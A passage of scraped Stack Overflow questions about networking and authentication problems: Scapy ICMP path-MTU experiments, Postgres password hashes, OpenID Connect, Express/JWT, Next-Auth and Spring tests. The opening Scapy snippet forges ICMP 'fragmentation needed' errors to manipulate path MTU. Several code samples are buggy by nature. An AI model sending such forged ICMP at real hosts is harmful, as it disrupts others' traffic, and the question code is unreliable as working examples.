    icmp_error = IP(dst = pkt[IP].src, flags = 2)/ICMP(type = 3, code = 4, nexthopmtu = 1000)/ip_orig/icmp_orig
    send(icmp_error, iface=&quot;eth0&quot;)

if __name__ == '__main__':
    sniff(prn=callback,
          store=0,
          filter=&quot;greater 1000&quot;,
          iface=&quot;eth0&quot;)
</code></pre>
<p>The problem: If I am sending the ping with OS (using ping command in Linux) I am able to successfully reduce the path MTU to 1000.
HOWEVER, If I am sending the ping with scapy it ignores the ICMP error with indicated path MTU and does not fragment the packet.</p>
<p>Can someone help me out with this? I want to expand this to other protocols like UDP as well.</p>
"
"<p>I'm Googling for several days and I can't find anything useful.</p>
<p>My question is how to wire up the complete backend servers.</p>
<p>So I have my router, loadbalancer from kemp, two hardware servers (one for the API backend, one for database).</p>
<p>The loadbalancer directs to different instances of the node js backend on server 1, server 1 should access server to the DataBase.</p>
<p>Whats better? Going from API to database over the switch or to hardwire the two servers directly?</p>
<p>And the important question is how to secure all that... DMZ, firewall, etc... I don't have any ideas and I only find how to set up loadbalancers with the routes etc but not how I should hookup the whole rack...</p>
<p>I'm thankful for every hint or solution!</p>
"
"<p>I'd like to know if anyone has a good resource that explains in technical detail how apps (e.g. banking apps) that push an authorisation message through the app to authorise certain transactions work? Something which explains the architecture end to end would be great.</p>
<p>E.g. Does the mobile app poll the backend in the background or are there websockets in play?</p>
<p>I've tried to search but many explanations are either high level functional descriptions or mainly cover generic notification architectures. Many thanks in advance.</p>
"
"<p>I want to alter a users password with the password of another user.</p>
<p>something like -</p>
<pre><code>$pswd = SELECT rolpassword FROM pg_authid where rolname='rolea';
ALTER USER 'roleb' WITH ENCRYPTED PASSWORD $'pswd';
</code></pre>
<p>I confirmed the above query works by quering the pg_authid and comparing the rolpassword col of both the roles.</p>
<blockquote>
<p>postgres=&gt; select rolname, rolpassword from pg_authid;</p>
</blockquote>
<pre><code>          rolname          |             rolpassword
---------------------------+-------------------------------------
 rolea                     | md5594fcbdd4e37f23f02887d56a2930588
 roleb                     | md5594fcbdd4e37f23f02887d56a2930588
</code></pre>
<p>However, when I try to login to roleb with the password of rolea it says invalid password. Later I found that the md5 is generated with the concatenation of md5(password+username) so is there any other way to set a users password to that of another user?</p>
"
"<p><strong>Problem Description</strong>: I'm encountering an issue with Microsoft login integration using OpenID Connect in my ASP.NET Core application specifically in the production environment.</p>
<p>Locally, the authentication works fine, but when deployed to production, I'm consistently receiving the following exception:</p>
<blockquote>
<p>Microsoft.IdentityModel.Protocols.OpenIdConnect.OpenIdConnectProtocolException: Message contains error: 'invalid_grant', error_description: 'AADSTS54005: OAuth2 Authorization code was already redeemed, please retry with a new valid code or use an existing refresh token. Trace ID: 799927cb-d118-4e83-b1e4-6f2ebe724400 Correlation ID:</p>
</blockquote>
<p><strong>Environment</strong>: this issue is specific to the production environment; locally, the authentication process works as expected.</p>
<p><strong>Code</strong>: I've included the relevant code snippet from my <code>Program.cs</code> file where I configure the authentication using <code>AddOpenIdConnect</code>.</p>
<pre><code>builder.Services.AddAuthentication(options =&gt;
{
    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    options.DefaultSignInScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    options.DefaultChallengeScheme = &quot;OpenIdConnect&quot;;
})
.AddCookie(options =&gt;
{
    options.Cookie.SameSite = SameSiteMode.None;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.HttpOnly = true;
})
.AddOpenIdConnect(&quot;OpenIdConnect&quot;, options =&gt;
{
    var microsoftOptions = builder.Services.BuildServiceProvider().GetRequiredService&lt;IOptions&lt;MicrosoftAuthenticationOptions&gt;&gt;().Value;
    options.ClientId = microsoftOptions.ClientId;
    options.ClientSecret = microsoftOptions.ClientSecret;
    options.Authority = microsoftOptions.Authority;
    options.CallbackPath = &quot;/signin-oidc&quot;;
    options.ResponseType = &quot;code&quot;;
    options.TokenValidationParameters = new TokenValidationParameters
    {
        ValidateIssuer = true,
        ValidIssuer = options.Authority,
        ValidAudience = options.ClientId
    };
    options.SaveTokens = true;
    options.UsePkce = true;
    options.Scope.Add(&quot;openid&quot;);
    options.Scope.Add(&quot;email&quot;);
    options.Scope.Add(&quot;profile&quot;);
    options.UseTokenLifetime = false;
});
</code></pre>
<p>Troubleshooting steps taken:</p>
<ul>
<li>Checked the client credentials (client ID and secret) to ensure they are correct.</li>
<li>Verified the authority URL and callback path configuration.</li>
<li>Reviewed the token validation parameters to ensure they are set correctly.</li>
<li>Tried adjusting the authentication settings such as <code>UsePkce</code> and <code>UseTokenLifetime</code>, but the issue persists.</li>
</ul>
<p><strong>Goals</strong></p>
<ul>
<li>I want to understand why this exception occurs specifically in the production environment. In the local environment, it's working well.</li>
<li>I want to identify any misconfiguration or issues in the authentication setup.</li>
<li>Find a resolution or workaround to successfully authenticate users with Microsoft login using OpenID Connect in the production environment.</li>
</ul>
<p>Any insights or suggestions on resolving this issue would be greatly appreciated. Thank you in advance for your assistance!</p>
"
"<p>I'm encountering an issue in my web application where I'm receiving the error message &quot;Failed to load resource: the server responded with a status of 500 (Internal Server Error)&quot; in the browser console. This error occurs when trying to load a particular resource from the server.</p>
<p>Here's what I've already checked:</p>
<p>Verified that the URL for the resource is correct.
Checked the code, error and data used for any additional information about the internal server error.
Ensured that the server is running and accessible.
Verified that the server is properly configured to handle the requested resource.
Despite these checks, I'm still unable to resolve the issue. Could someone please provide guidance on further troubleshooting steps or potential causes for this error? Any assistance would be greatly appreciated. Thank you!
<a href=""https://i.stack.imgur.com/7HML8.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7HML8.png"" alt=""Error"" /></a>
Data
<a href=""https://i.stack.imgur.com/iRid5.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/iRid5.png"" alt=""Data"" /></a></p>
<p><strong>Codes</strong>
App.js</p>
<pre><code>import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Route, Redirect } from 'react-router-dom';
import './App.css';
import RoomDetail from './components/dashboard/Rooms/RoomDetail';
import ListingBooking from './components/dashboard/Booking/BookingList';
import ListingRoom from './components/dashboard/Rooms/RoomsList';
import ListUsers from './components/dashboard/Customers/UsersList';
import Signin from './components/dashboard/Customers/Signin';
import Signup from './components/dashboard/Customers/Signup';
import ListRoom from './components/ListRoom';
import Dashboard from './components/dashboard/Dashboard';
import axios from 'axios';

function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [userType, setUserType] = useState('');
  const [loading, setLoading] = useState(true);

  useEffect(() =&gt; {
    const checkLoggedIn = async () =&gt; {
      try {
        const token = localStorage.getItem('isLoggedIn');
        if (token) {
          // Validate the token on the server
          const response = await axios.post('http://localhost:5000/api/accounts/signin', {
            token,
          });
          setIsLoggedIn(true);
          setUserType(response.data.user.role);
        }
      } catch (error) {
        console.error('Error checking login status:', error);
        console.log(&quot;Response &quot;, await axios.post('http://localhost:5000/api/accounts/signin'))

      } finally {
        setLoading(false);
      }
    };

    checkLoggedIn();
  }, []);

  const isAuthenticated = () =&gt; {
    return isLoggedIn &amp;&amp; userType === 'admin';
  };

  if (loading) {
    return &lt;div&gt;Loading...&lt;/div&gt;;
  }

  return (
    &lt;Router&gt;
      &lt;div&gt;
        &lt;Route exact path=&quot;/&quot; component={() =&gt; &lt;h2&gt;Home&lt;/h2&gt;} /&gt;
        &lt;Route
          exact
          path=&quot;/dashboard&quot;
          render={() =&gt; (isAuthenticated() ? &lt;Dashboard /&gt; : &lt;Redirect to=&quot;/signin&quot; /&gt;)}
        /&gt;
        &lt;Route
          exact
          path=&quot;/dashboard/rooms/:roomId&quot;
          render={() =&gt; (isAuthenticated() ? &lt;RoomDetail /&gt; : &lt;Redirect to=&quot;/signin&quot; /&gt;)}
        /&gt;
        &lt;Route
          exact
          path=&quot;/dashboard/rooms/&quot;
          render={() =&gt; (isAuthenticated() ? &lt;ListingRoom /&gt; : &lt;Redirect to=&quot;/signin&quot; /&gt;)}
        /&gt;
        &lt;Route
          exact
          path=&quot;/dashboard/customers&quot;
          render={() =&gt; (isAuthenticated() ? &lt;ListUsers /&gt; : &lt;Redirect to=&quot;/signin&quot; /&gt;)}
        /&gt;
        &lt;Route exact path=&quot;/signin&quot; component={Signin} /&gt;
        &lt;Route exact path=&quot;/signup&quot; component={Signup} /&gt;
        &lt;Route exact path=&quot;/&quot; component={ListRoom} /&gt;
      &lt;/div&gt;
    &lt;/Router&gt;
  );
}

export default App;
</code></pre>
<p>Signin code</p>
<pre><code>import React, { useState } from 'react';
import { Redirect } from 'react-router-dom'; // Import Redirect
import Button from '@mui/material/Button';
import TextField from '@mui/material/TextField';
import Typography from '@mui/material/Typography';
import Container from '@mui/material/Container';
import axios from 'axios';

const Signin = () =&gt; {
  const [formData, setFormData] = useState({ emailOrUsername: '', password: '' });
  const [error, setError] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false); // Track authentication status

  const handleInputChange = (event) =&gt; {
    const { name, value } = event.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (event) =&gt; {
    event.preventDefault();

    try {
      const response = await axios.post('http://localhost:5000/api/accounts/signin', formData);

      if (response.status === 200) {
        setIsLoggedIn(true); 
      } else {
        setError('An error occurred while signing in. Please try again later.');
      }
    } catch (error) {
      console.error('Error signing in:', error);
      setError('An error occurred while signing in. Please try again later.');
    }
  };

  // Redirect if logged in
  if (isLoggedIn) {
    return &lt;Redirect to=&quot;/dashboard&quot; /&gt;;
  }

  return (
    &lt;Container component=&quot;main&quot; maxWidth=&quot;xs&quot;&gt;
      &lt;Typography component=&quot;h1&quot; variant=&quot;h5&quot;&gt;
        Sign in
      &lt;/Typography&gt;
      &lt;form onSubmit={handleSubmit}&gt;
        &lt;TextField
          variant=&quot;outlined&quot;
          margin=&quot;normal&quot;
          required
          fullWidth
          id=&quot;emailOrUsername&quot;
          label=&quot;Email or Username&quot;
          name=&quot;emailOrUsername&quot;
          autoComplete=&quot;email&quot;
          autoFocus
          value={formData.emailOrUsername}
          onChange={handleInputChange}
        /&gt;
        &lt;TextField
          variant=&quot;outlined&quot;
          margin=&quot;normal&quot;
          required
          fullWidth
          name=&quot;password&quot;
          label=&quot;Password&quot;
          type=&quot;password&quot;
          id=&quot;password&quot;
          autoComplete=&quot;current-password&quot;
          value={formData.password}
          onChange={handleInputChange}
        /&gt;
        &lt;Button type=&quot;submit&quot; fullWidth variant=&quot;contained&quot; color=&quot;primary&quot;&gt;
          Sign In
        &lt;/Button&gt;
        {error &amp;&amp; &lt;Typography color=&quot;error&quot;&gt;{error}&lt;/Typography&gt;}
      &lt;/form&gt;
    &lt;/Container&gt;
  );
};

export default Signin;
</code></pre>
<p>Account Model</p>
<pre><code>const mongoose = require('mongoose');

const accountSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true,
    unique: true
  },
  password: {
    type: String,
    required: true
  },
  role: {
    type: String,
    enum: ['admin', 'user'],
    required: true
  },
  user: {
    firstName: {
      type: String,
      required: true
    },
    lastName: {
      type: String,
      required: true
    },
    email: {
      type: String,
      required: true,
      unique: true
    },
  }
});

const Account = mongoose.model('Account', accountSchema);

module.exports = Account;
</code></pre>
<p>Account Route</p>
<pre><code>const express = require(&quot;express&quot;);
const bcrypt = require(&quot;bcrypt&quot;);
const jwt = require(&quot;jsonwebtoken&quot;);
const Account = require(&quot;../models/Account&quot;);
const router = express.Router();

// Route to get all accounts
router.get(&quot;/&quot;, async (req, res) =&gt; {
  try {
    // Find all accounts
    const accounts = await Account.find();

    res.status(200).json({ accounts });
  } catch (error) {
    console.error(&quot;Error fetching accounts:&quot;, error);
    res.status(500).json({ message: &quot;Internal server error&quot; });
  }
});

// Route to create a new account
router.post(&quot;/signup&quot;, async (req, res) =&gt; {
  try {
    const { user, username, email, password, role } = req.body;

    // Check if the email is already registered
    const existingAccount = await Account.findOne({ email });
    if (existingAccount) {
      return res.status(400).json({ message: &quot;Email is already registered&quot; });
    }

    // Hash the password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Create the new user
    const newAccount = await Account.create({
      user,
      username,
      password: hashedPassword,
      role,
    });

    res
      .status(201)
      .json({ message: &quot;Account created successfully&quot;, user: newAccount });
  } catch (error) {
    console.error(&quot;Error creating account:&quot;, error);
    res.status(500).json({ message: &quot;Internal server error&quot; });
  }
});

// Route to get account by ID
router.get(&quot;/:_id&quot;, async (req, res) =&gt; {
  try {
    const { accountId } = req.params;

    // Find account by ID and populate the user field
    const account = await Account.findById(accountId).populate(&quot;user&quot;);

    if (!account) {
      return res.status(404).json({ message: &quot;Account not found&quot; });
    }

    // Return the account details
    res.status(200).json({ account });
  } catch (error) {
    console.error(&quot;Error fetching account:&quot;, error);
    res.status(500).json({ message: &quot;Internal server error&quot; });
  }
});

// Route to signin
router.post(&quot;/signin&quot;, async (req, res) =&gt; {
  try {
    const { email, password } = req.body;

    // Check if the email is registered
    const user = await Account.findOne({ email });
    if (!user) {
      return res.status(404).json({ message: &quot;Account not found&quot; });
    }

    // Compare passwords
    const isPasswordValid = await bcrypt.compare(password, user.password);
    if (!isPasswordValid) {
      return res.status(401).json({ message: &quot;Invalid credentials&quot; });
    }

    const secretKey = process.env.JWT_SECRET;

    // Sign JWT token
    const token = jwt.sign({ userId: user._id }, secretKey, {
      expiresIn: &quot;1h&quot;,
    });

    res.status(200).json({ message: &quot;Signin successful&quot;, token });
  } catch (error) {
    console.error(&quot;Error signing in:&quot;, error);
    res.status(500).json({ message: &quot;Internal server error&quot; });
  }
});


module.exports = router;
</code></pre>
"
"<p>I currently have a decent authentication logic in place which will verify credentials against the database document/entry.</p>
<p>Once a login request has a successful response, I set a httpOnly cookie including the unique userID and I return the user as a response to the client. The client however can not read/write to the httpOnly cookie, so I currently check if the httpOnly cookie is valid (based on it's value and expiration). I have a middleware that rejects or forwards requests based on the httpOnly cookie validity.</p>
<p><strong>[Potential solution]:</strong>
I could have the client side hit a specific endpoint that checks the validity of the cookie, and if it's valid it will grab and return the user matching the cookie value (userID). This means every navigation change or endpoint being hit, the client sends a request to the server to check the cookie first. Long story short: all web application navigation and API requests will be preceded by a API request to check the cookie validity.</p>
<pre class=""lang-js prettyprint-override""><code>  public login = async (req: Request, res: Response, next: NextFunction): Promise&lt;void&gt; =&gt; {
    try {
      const { username, password } = req.body;
      const serviceResponse = await this.authService.login({
        username: username,
        password: password,
      });

      if (serviceResponse.error) {
        // Something went wrong, expose error to client.
        res.status(serviceResponse.code).json(serviceResponse);
      } else {
        // Authentication succeeced!
        this.setHttpCookie(res, serviceResponse.data['id']);
        res.status(serviceResponse.code).json(serviceResponse);
      }
    } catch (error) {
      if (error instanceof Error) {
        const errorResponse: ResponseInterface = {
          data: null,
          error: true,
          message: error.message,
          code: 400,
        };
        res.status(errorResponse.code).json(errorResponse);
      } else {
        // Let Express handle the error for now:
        next(error);
      }
    }
  };
</code></pre>
<p>And here's my middleware, to give you an idea of what I'm doing at the moment:</p>
<pre class=""lang-js prettyprint-override""><code>import { NextFunction, Request, Response } from 'express';
import UserModel from '../models/user.model';
import { COOKIE_NAME_AUTH } from '../config';
import { ResponseInterface } from '../interfaces/response.interface';

const AuthenticationMiddleware = async (req: Request, res: Response, next: NextFunction) =&gt; {
  try {
    const cookieValue = req.cookies[`${COOKIE_NAME_AUTH}`];
    console.log(cookieValue);

    if (!cookieValue) {
      throw new Error('Cookie expired or is empty. Access has been denied!');
    }

    const user = await UserModel.findById(cookieValue);

    if (!user) {
      // Can happen if the user has been deleted from the DB.
      throw new Error('Can not verify the cookie value. Access has been denied!');
    }
    next();
  } catch (error) {
    if (error instanceof Error) {
      const errorResponse: ResponseInterface = {
        data: null,
        error: true,
        message: error.message,
        code: 400,
      };
      res.status(errorResponse.code).json(errorResponse);
    } else {
      // Let Express handle the error for now:
      next(error);
    }
  }
};

export default AuthenticationMiddleware;
</code></pre>
"
"<p>I'm currently testing it in Postman, following the guides below:</p>
<ul>
<li>create an app: <a href=""https://developers.tiktok.com/doc/getting-started-create-an-app"" rel=""nofollow noreferrer"">https://developers.tiktok.com/doc/getting-started-create-an-app</a></li>
<li>fetching access token: <a href=""https://developers.tiktok.com/doc/oauth-user-access-token-management/"" rel=""nofollow noreferrer"">https://developers.tiktok.com/doc/oauth-user-access-token-management/</a></li>
</ul>
<p>However, I keep getting errs when trying to get the access token:</p>
<ul>
<li>Error: invalid_request, Description: The request parameters are malformed.</li>
<li>Error: Could not complete OAuth 2.0 token request</li>
</ul>
<p>Here are my settings on the Authorization tab</p>
<ul>
<li>grant type: authorization code</li>
<li>callback url: <a href=""https://oauth.pstmn.io/v1/callback"" rel=""nofollow noreferrer"">https://oauth.pstmn.io/v1/callback</a> (authorize using browser)</li>
<li>auth url: <a href=""https://www.tiktok.com/v2/auth/authorize/?client_key=123"" rel=""nofollow noreferrer"">https://www.tiktok.com/v2/auth/authorize/?client_key=123</a></li>
<li>access token url: <a href=""https://open.tiktokapis.com/v2/oauth/token/"" rel=""nofollow noreferrer"">https://open.tiktokapis.com/v2/oauth/token/</a></li>
<li>client id: 123</li>
<li>client secret: 321</li>
<li>scope: user.info.basic</li>
<li>state: state123456</li>
<li>client authentication: send as basic auth header</li>
</ul>
<p>Here it is on Postman:</p>
<p><a href=""https://i.stack.imgur.com/ftnES.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ftnES.png"" alt=""Postman setup"" /></a></p>
<p>When I hit <code>get access token</code>, it correctly directs me to the TikTok authentication (ie TikTok wants to access your acc) page, but after hitting continue on that it'll redirect me back to Postman and err out.</p>
<p>These are my headers:</p>
<p><a href=""https://i.stack.imgur.com/B4FoA.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/B4FoA.png"" alt=""enter image description here"" /></a></p>
<p>My app has previously been reviewed &amp; approved, but I made a few changes so it's back in <code>staging</code> - I'm not getting a redirect_uri err which you would if your app was in submission, so not sure if this could be causing it as well?  Any help would be appreciated, thanks!</p>
"
"<p>This is how I am currently introspecting the authorization token sent on requests on my flask application. However, even though this works, I would like to use authlib but couldn't find the equivalent of this simple workflow there.</p>
<pre><code>   @app.before_request
    def validate_token():
        token = request.headers.get('Authorization')
        if token is None:
            return &quot;Missing token&quot;, 401
        token = token.split(' ')[1]
        token_info = introspect_token(token)
        if not token_info['active']:
            return &quot;Invalid token&quot;, 401
        g.user = token_info
    
    def introspect_token(token):
        url = DEFAULT_AUTH_URI + '/token/introspect'
        data = {'token': token}
        auth = (CLIENT_ID, CLIENT_SECRET)
        resp = requests.post(url, data=data, auth=auth)
        resp.raise_for_status()
        return resp.json()
</code></pre>
<p>I already have a server_metadata_url working to set it up, at least I'd like to use its <code>introspection_endpoint</code> key value pair instead of <code>DEFAULT_AUTH_URI + '/token/introspect'</code>. Any tips?</p>
"
"<p>I'm trying to prevent users of type &quot;member&quot; from accessing a dashboard. This dashboard shares the same authentication endpoint as the main site. In the POST request to the <code>/login</code> endpoint I'm trying to pass another paramater <code>env=&quot;dashboard</code> so that I can tell then return a 400 if the user is a &quot;member&quot; instead of an &quot;admin&quot;.</p>
<p>The problem is that this parameter gets stripped out when it reaches the <code>validate()</code> callback in the local strategy. So as far as I can tell it looks like it only expects a username and password. Is there a way to achieve this whilst still keeping the <code>LocalStrategy</code> with the <code>validate</code>?</p>
<p><strong>local.strategy.ts</strong></p>
<pre><code>@Injectable()
export class LocalStrategy extends PassportStrategy(Strategy, 'local') {
  constructor(private authService: AuthService) {
    super({
      usernameField: 'email',
      environment: 'environment',
    });
  }
  async validate(
    email: string,
    password: string,
    environment: string 
//this environment doesn't make it to the getAuthenticatedUser method despite being on
// the request object 
  ): Promise&lt;User&gt; {
    return this.authService.getAuthenticatedUser(email, password, environment);
  }
}
</code></pre>
<p>I have tried doing like suggested in this <a href=""https://stackoverflow.com/questions/68171886/nestjs-passport-local-strategy-validate-method-never-called"">SO question</a>
and add it to the <code>super()</code> but still get the same result and when I log the value of environment I get: <code>[Function: verified]</code></p>
<p>The providers in the <strong>auth.module.ts</strong> look like this:</p>
<pre><code>providers: [
    AuthService,
    LocalStrategy,
    JwtStrategy,
    ApiKeyStrategy,
    AdminApiKeyStrategy,
  ],
</code></pre>
<p>Is there anything I'm missing or is it possible at all to achieve what I'm trying?</p>
"
"<p>I'm currently facing some challenges with implementing user authentication in my Next.js 14 application using the next-auth package. Despite setting up the necessary routes and configuration files, the default signin and signout routes are not functioning as expected, and the session seems to persist even when the user hasn't signed in. Here are the specifics of my setup:</p>
<p>Environment:</p>
<p>&quot;next&quot;: &quot;14.1.0&quot;
&quot;next-auth&quot;: &quot;5.0.0-beta.9&quot;
Setup:</p>
<p>I have created the following files under the route src/app/api/auth/[...nextauth]/:</p>
<p>route.js
options.js
Observations:</p>
<p>When I log the session from header.jsx, I receive the following output:</p>
<pre><code>  handlers: { GET: [Function: httpHandler], POST: [Function: httpHandler] },
  auth: [Function (anonymous)],
  signIn: [Function: signIn],
  signOut: [Function: signOut],
  unstable_update: [Function: unstable_update]
}
</code></pre>
<p>Issues:</p>
<p>The session appears to exist by default, even though the user hasn't signed in.
Attempting to signin/signout at &quot;localhost:3000/api/auth/signin&quot; results in an &quot;Error 500&quot; on the browser.
Request for Help:</p>
<p>Could someone please assist me in troubleshooting these issues? Additionally, please let me know if there are any other details or code snippets I can provide to clarify the situation further.</p>
<p>Thank you for your help!</p>
"
"<p>Every time I try to log in I always return to the login page i cant redirect to my dashboard.I have tried dd() and Auth::check and the results are all success</p>
<p>here my AuthController</p>
<pre><code>use App\Http\Controllers\Controller;

use App\Models\User;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Redirect;

    public function loginProses(Request $request): RedirectResponse
    {
        $request-&gt;validate([
            'email'=&gt;'required',
            'password'=&gt;'required'
        ],[
            'email.required'=&gt;'Email wajib diisi',
            'password.required'=&gt;'Password wajib diisi',
        ]);

        $infologin = [
            'email'=&gt;$request-&gt;email,
            'password'=&gt;$request-&gt;password,
        ];

        if (Auth::attempt($infologin)) {
            $request-&gt;session()-&gt;regenerate();
            // if (Auth::check()) {
            //     return &quot;success&quot;;
            // } else {
            //     return &quot;not&quot;;
            // }
            return redirect()-&gt;intended('dashboard');
            // dd($infologin);
        }else{
            return redirect('/laravel')-&gt;withErrors('Username atau Password Salah')-&gt;withInput();
        }
    }
</code></pre>
<p>my DashboardController that I want to go to</p>
<pre><code>use App\Models\User;
use App\Models\Buku;
use App\Models\Kategori;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

    public function index()
    {
        $totalBooks = Buku::count();
        return view('backend.index', ['totalBooks' =&gt; $totalBooks]);
    }
</code></pre>
<p>my web Route</p>
<pre><code>use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\BukuController;
use App\Http\Controllers\KategoriController;
use App\Http\Controllers\UsersController;

Route::group(['middleware' =&gt; 'auth'], function (){
    Route::resource('dashboard', \App\Http\Controllers\DashboardController::class);
    Route::resource('buku', \App\Http\Controllers\BukuController::class);
    Route::resource('kategori', \App\Http\Controllers\KategoriController::class);
    Route::delete('/logout', [AuthController::class, 'logout'])-&gt;name('logout');
});
</code></pre>
<p>I want to access the dashboard page that I gave the auth middleware</p>
"
"<p>This happens when I try to create a topic</p>
<pre><code>   TypeError: this.auth.getUniverseDomain is not a function
        at GrpcClient.createStub (/Users/&lt;...&gt;/node_modules/google-gax/src/grpc.ts:418:48)
        at processTicksAndRejections (node:internal/process/task_queues:95:5)
</code></pre>
<p>Sample Code:</p>
<pre><code>pubSubClient = new PubSub({
      &quot;projectId&quot;: &quot;project_name&quot;
    });

initTopic = async () =&gt; {
    // Creates a new topic if it does not exist
    const [topics] = await this.pubSubClient.getTopics()
    RootLogger.info(&quot;topic names: &quot; + topics.join(&quot;,&quot;))
    const topicExists = topics.some(topic =&gt; topic.name.endsWith(this.topicName));

    if (topicExists) {
      RootLogger.info(`Topic ${this.topicName} already exists.`);
    } else {
      await this.pubSubClient.createTopic(this.topicName);
      RootLogger.info(`Topic ${this.topicName} created.`);
    }
  }
</code></pre>
"
"<p>We have a nextJs + Next-Auth application, which uses OAuth external authentication. This site sets a JWT token which can be captured in the <code>jwt()</code> callback, and can be include into the session token, and send back to the nextJs app. This JWT token is needed on client side also, because must be attached to external REST API calls as authorization token.</p>
<p>My plan is to set a Service Worker on the client side to catch and store the JWT token, extract it from the nextJs session, and later by listening to fetch events modify the call and adds to the http header as authorization bearer token.</p>
<p>There are several problem arises:</p>
<ul>
<li>first: the worker must be installed before the external API call happens. I must add the worker install to the pages with <code>useEffect()</code>. But using a SSO the application might begins on any page. I don't think it is a good solution to add this <code>useEffect()</code> and <code>worker install</code> to all pages we have.</li>
<li>lets suppose the worker is installed, how to read the nextJs session token? How to capture a session token? Currently I read the JWT token from the session using <code>useSession()</code> on the page and sends it to the worker using <code>postMessage()</code> - but also: I dont want to put this code to all my pages, and still don't know which pages loads first.</li>
<li>third: when the JWT token is read and stored by the ˙worker, there is no need to send the jwt token every time when a nextJs session is read (its a quite long string). How can I <em>inform</em> the next-auth side, that the token is extracted, and no longer is needed to attach to the session token?</li>
</ul>
<p>Almost all the problem could be solved, if I would able to send a custom query to the next-auth side, other than the existing callbacks, to query the JWT token when the ˙service worker` is  installed and up. It would store the JWT token inside the worker, then modify the fetch calls as described above. <em>Is it possible to extend the Next-Auth rest api with additional methods?</em></p>
<pre><code>// on all page.tsx ?
useEffect(() =&gt; {
        (async () =&gt; await workerInstall());
}, []);

// this is a library .js code
async function workerInstall() {
  if ('serviceWorker' in navigator) {
     await navigator.serviceWorker.register('/service-worker.js');
  }
}
</code></pre>
<p>Also: how to install the <code>service worker</code> on (all of) the NextJS application pages?</p>
"
"<h1>Problem</h1>
<p>Hello!
I've been unit testing a spring boot restful practice project i've been working on and there weren't any issues, but when i started testing authentication business logic, some tests would pass on the first run but won't on the next one and vice versa.</p>
<h1>Possible reason #1</h1>
<p>The logic i've been testing includes <code>Java Mail Sender</code> (for email confirmation or forgot password requests) and the methods behind that logic are annoted with <code>@Transactional</code> and <code>@Async</code>. I believe the problem is due to tests not being async, however i tried tinkering with <code>@Transactional</code> and <code>@Async</code> annotations on my tests, but i was unsuccessfull.</p>
<h1>Possible reason #2</h1>
<p>Another reason for this problem might be that im not resetting my mocks, however when i tried using teardown and <code>@AfterEach</code> to reset mocked instances, it didn't help at all, or maybe im using it wrongly.</p>
<h1>Tests Results</h1>
<p><a href=""https://i.stack.imgur.com/4iBDU.jpg"" rel=""nofollow noreferrer"">Successfull run</a></p>
<p><a href=""https://i.stack.imgur.com/wwoYP.jpg"" rel=""nofollow noreferrer"">Reruned same tests few seconds after the previous run</a></p>
<h1>Code example</h1>
<pre><code>@Service
@AllArgsConstructor
public class AuthenticationService {

    private final UserRepository userRepository;
    //TokenService instances are @Qualifier
    private final TokenService emailConfirmationTokenService;
    private final TokenService resetPasswordTokenService;
    private final PasswordEncoder encoder;

 @Transactional
    public void confirmEmail(String value) {
        emailConfirmationTokenService.confirmToken(value);
    }

    @Transactional
    public void resetPassword(String value, ResetPasswordRequestDTO requestDTO) {
        User user = resetPasswordTokenService.getUserByToken(value);

        resetPasswordTokenService.confirmToken(value);

        user.setPassword(encoder.encode(requestDTO.newPassword()));
        userRepository.save(user);
    }
}
</code></pre>
<pre><code>@ExtendWith(MockitoExtension.class)
public class AuthenticationServiceUnitTest {
    @Mock
    private UserRepository userRepository;
    @Mock
    private Properties properties;

    @Mock
    private User user;
    @Mock
    private AuthenticationHelper authenticationHelper;

    @Mock
    private PasswordEncoder passwordEncoder;
    @Mock
    private EmailService emailService;
    @Mock
    private ResetPasswordTokenService resetPasswordTokenService;
    @Mock
    private EmailConfirmationTokenService emailConfirmationTokenService;
    @InjectMocks
    private AuthenticationService authenticationService;

 @AfterEach
    void tearDown() {
        reset(userRepository, passwordEncoder, emailService,
                emailConfirmationTokenService, resetPasswordTokenService,passwordEncoder,
                authenticationHelper, properties);
    }

    @Test
    void shouldSendResetPasswordEmail() throws MessagingException {
        String recipient = &quot;user@example.com&quot;;
        User userRequesting = new User();
        userRequesting.setEmail(recipient);
        String resetURL = &quot;reset-url&quot;;
        String token = &quot;generated token&quot;;
        String fullURL = &quot;reset-urlgenerated token&quot;;

        ForgotPasswordRequestDTO requestDTO = new ForgotPasswordRequestDTO(recipient);

        when(userRepository.findUserByEmailIgnoreCase(recipient)).thenReturn(Optional.of(userRequesting));
        when(properties.getResetURL()).thenReturn(resetURL);
        when(resetPasswordTokenService.generateToken(userRequesting)).thenReturn(token);

        authenticationService.forgotPassword(requestDTO);

        System.out.println(fullURL);
        verify(emailService).sendResetPasswordEmail(userRequesting, fullURL);

    }

    @Test
    void shouldThrowResourceNotFoundWhenProvidedInvalidEmailForForgotPassword() {
        String recipient = &quot;notfound@example.com&quot;;
        ForgotPasswordRequestDTO requestDTO = new ForgotPasswordRequestDTO(recipient);

        when(userRepository.findUserByEmailIgnoreCase(recipient)).thenThrow(ResourceNotFoundException.class);

        assertThrows(ResourceNotFoundException.class, () -&gt; authenticationService.forgotPassword(requestDTO));
    }

    @Test
    void shouldResetPassword() {

        String tokenValue = &quot;validToken&quot;;
        String newPassword = &quot;newSecurePassword&quot;;
        User user = new User();

        when(resetPasswordTokenService.getUserByToken(tokenValue)).thenReturn(user);
        doNothing().when(resetPasswordTokenService).confirmToken(tokenValue);
        when(passwordEncoder.encode(newPassword)).thenReturn(newPassword); // Mock password encoding

        authenticationService.resetPassword(tokenValue, new ResetPasswordRequestDTO(newPassword, newPassword));


        verify(userRepository).save(user);
